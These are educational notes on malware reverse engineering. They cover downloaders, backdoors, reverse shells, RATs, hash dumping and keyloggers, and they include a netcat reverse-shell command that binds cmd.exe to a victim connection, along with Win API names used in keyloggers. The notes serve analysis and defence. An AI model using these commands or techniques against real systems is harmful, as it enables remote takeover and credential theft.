# Malware Techniques

> Content credited to: [https://securedorg.github.io/RE101/section2.1/](https://securedorg.github.io/RE101/section2.1/)

## Downloaders and Launchers {#downloaders-and-launchers}

Downloaders download malware + execute on system.

* commonly use Win API:

```
URLDownloadToFileA
WinExec

```

Launcher \(loader\) any executable that installs malware for immediate or future covert execution.

often contain malware designed to load.

## Backdoors {#backdoors}

provides attacker with remote access

communicate commonly over HTTP port 80 \(best way to blend in to network traffic\)

Common set of functionality:

* manipulate registry keys
* enumerate display windows
* create directories
* search files

### Reverse Shell {#reverse-shell}

connection originating from victim machine, providing access to the victim machineâ€™s shell.

Netcat is a common tool in use as a reverse shell

Listening on incoming connections:

```
nc -l -p 80

```

`-l`-&gt; listen  
`-p`-&gt; port

Attacker connects via:

```
nc [victim-ip] 80 -e cmd.exe

```

`-e`-&gt; execute once connection established

#### Windows Reverse Shells {#windows-reverse-shells}

Two coding implementations using`cmd.exe`:

* basic -
  &gt;
   easier to write, works as well as +threaded
  * Socket is created and connection to remote is created.
  * Socket is tied to std streams \(input, output, err\)
  * Windows suppressed from victim
* multithreaded
  * Socket is created, two pipes, two threads.
  * `CreatePipe`
    ties together read/write ends to a pipe \(stdin, stdout\).
  * `CreateProcess`
    ties the standard streams to pipes instead of directly to sockets.
  * Two threads spawned \(I/O\)

### Remote Administration Tool \(RAT\) {#remote-administration-tool-rat}

remotely manage a computer\(s\)

often used in targeted attacks, moving laterally across network.

## Compression

## Obfuscation

## Persistence

## Privilege Escalation

## Defense Evasion

## Credential Stealers

3 types of malware:

1. Programs wait for a user to log in to steal creds
2. Programs that dump info \(such as pass hashes\)
3. Programs that log keystrokes

### GINA interception {#gina-interception}

Windows XP:`Graphical Identification and Authentication (GINA)`interception is a technique that malware uses to steal creds.

GINA is implemented in a DLL,`msgina.dll`, and is loaded by Winlogon exec during login.

### Hash Dumping {#hash-dumping}

Attackers try to grab hashes in order to crack them offline or use them in pass-the-hash attack, using LM and NTLM hashes to auth, without needing to decrypt or crack the hash.

`pwdump`and`pass-the-hash toolkit`are freely available packages.

### Keystroke Logging {#keystroke-logging}

malware records keystrokes so attacker can observed typed data

#### Kernel-based keyloggers {#kernel-based-keyloggers}

Difficult to detect with user-mode apps.

Usually part of a rootkit and can act as keyboard drivers to capture keystrokes, bypassing user-space programs

#### User-space keyloggers {#user-space-keyloggers}

typically use Win API

usually implemented with either hooking/polling.

Hooking -&gt; uses Win API to notify the malware each time a key is pressed \(typically`SetWindowsHookEx`\)

Polling -. uses Win API to constantly poll the state of the keys, typically via`GetAsyncKeyState`and`GetForegroundWindow`

Keyloggers can be identified in Strings listings that may show up as`[Up][Num Lock][Down][Right][UP][Left][PageDown]`

## Reconnaissance

## Lateral Movement

## Execution

## Collection

## Exfiltration

## Command and Control



